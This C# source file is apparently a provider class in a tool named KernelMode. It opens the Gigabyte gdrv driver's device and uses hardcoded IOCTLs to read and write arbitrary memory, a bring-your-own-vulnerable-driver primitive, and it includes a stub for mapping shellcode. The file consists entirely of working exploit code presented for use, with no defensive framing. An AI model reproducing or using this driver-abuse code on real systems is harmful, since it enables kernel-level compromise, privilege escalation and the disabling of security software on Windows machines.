// File: Providers/GdrvProvider.cs
// Project: KernelMode

using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using KernelMode.Providers;
using KernelMode.Utils;

namespace KernelMode.Providers
{
	public class GdrvProvider : IProvider
	{
		private const string DeviceName = "\\\\.\\GIO";
		private const uint IOCTL_READ = 0xC3502004;
		private const uint IOCTL_WRITE = 0xC3502008;

		private SafeFileHandle _handle;
		public bool IsInitialized { get; private set; }

		[StructLayout(LayoutKind.Sequential)]
		private struct PhysStruct
		{
			public ulong Address;
			public uint Size;
			public ulong Buffer;
		}
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool DeviceIoControl(
	SafeFileHandle hDevice,
	uint dwIoControlCode,
	IntPtr lpInBuffer,
	int nInBufferSize,
	IntPtr lpOutBuffer,
	int nOutBufferSize,
	out int lpBytesReturned,
	IntPtr lpOverlapped);
		public bool Initialize()
		{
			_handle = NativeMethods.CreateFile(DeviceName,
				NativeMethods.GENERIC_READ | NativeMethods.GENERIC_WRITE,
				0, IntPtr.Zero, NativeMethods.OPEN_EXISTING,
				0, IntPtr.Zero);

			IsInitialized = !_handle.IsInvalid && !_handle.IsClosed;
			return IsInitialized;
		}

		public bool ReadMemory(ulong address, byte[] buffer, int size)
		{
			if (!IsInitialized) return false;

			IntPtr tmpBuf = Marshal.AllocHGlobal(size);
			IntPtr physPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PhysStruct)));

			var phys = new PhysStruct
			{
				Address = address,
				Size = (uint)size,
				Buffer = (ulong)tmpBuf
			};

			Marshal.StructureToPtr(phys, physPtr, false);

			int bytesReturned;
			bool result = NativeMethods.DeviceIoControl(
				_handle,
				IOCTL_READ,
				physPtr,
				Marshal.SizeOf(typeof(PhysStruct)),
				physPtr,
				Marshal.SizeOf(typeof(PhysStruct)),
				out bytesReturned,
				IntPtr.Zero);

			if (result)
				Marshal.Copy(tmpBuf, buffer, 0, size);

			Marshal.FreeHGlobal(tmpBuf);
			Marshal.FreeHGlobal(physPtr);
			return result;
		}

		public bool WriteMemory(ulong address, byte[] buffer, int size)
		{
			if (!IsInitialized) return false;

			IntPtr tmpBuf = Marshal.AllocHGlobal(size);
			Marshal.Copy(buffer, 0, tmpBuf, size);

			IntPtr physPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PhysStruct)));

			var phys = new PhysStruct
			{
				Address = address,
				Size = (uint)size,
				Buffer = (ulong)tmpBuf
			};

			Marshal.StructureToPtr(phys, physPtr, false);

			int bytesReturned;
			bool result = NativeMethods.DeviceIoControl(
				_handle,
				IOCTL_WRITE,
				physPtr,
				Marshal.SizeOf(typeof(PhysStruct)),
				physPtr,
				Marshal.SizeOf(typeof(PhysStruct)),
				out bytesReturned,
				IntPtr.Zero);

			Marshal.FreeHGlobal(tmpBuf);
			Marshal.FreeHGlobal(physPtr);
			return result;
		}


		public bool MapShellcode(byte[] shellcode, ulong param)
		{
			Console.WriteLine("[-] GDRV does not support shellcode mapping directly.");
			return false;
		}

		public void Dispose()
		{
			_handle?.Dispose();
		}
	}
}
